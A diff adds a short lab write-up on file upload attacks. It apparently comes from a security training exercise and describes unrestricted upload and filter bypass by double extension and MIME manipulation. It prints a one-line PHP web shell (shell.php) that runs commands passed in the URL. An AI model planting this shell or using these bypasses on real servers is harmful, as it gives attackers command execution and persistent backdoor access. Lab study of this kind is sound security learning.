@@ -1,0 +1,66 @@
+File Upload Attacks – Injection Lab (Hub 2)
+Overview
+
+In this lab, I explored File Upload vulnerabilities, which occur when applications allow unsafe file uploads without validation.
+
+Objective
+
+The objective was to:
+
+Upload malicious files
+
+Bypass file validation
+
+Execute uploaded payloads
+
+What is a File Upload Attack?
+
+Occurs when:
+
+File type validation is weak
+
+Uploaded files are executable
+
+No proper server-side checks exist
+
+File Upload Challenge 1 – Unrestricted Upload
+Payload Used
+
+A PHP web shell:
+
+<?php system($_GET['cmd']); ?>
+
+File Name
+shell.php
+
+Result
+
+File uploaded successfully
+
+Commands executed via browser
+
+File Upload Challenge 2 – Filter Bypass
+Techniques Used
+
+Double extension:
+
+shell.php.jpg
+
+
+MIME type manipulation
+
+Result
+
+Upload bypassed restrictions
+
+Server executed the file
+
+Security Impact
+
+Full server compromise
+
+Persistent backdoor access
+
+Conclusion
+
+This lab demonstrated how improper file upload validation leads to severe security risks.
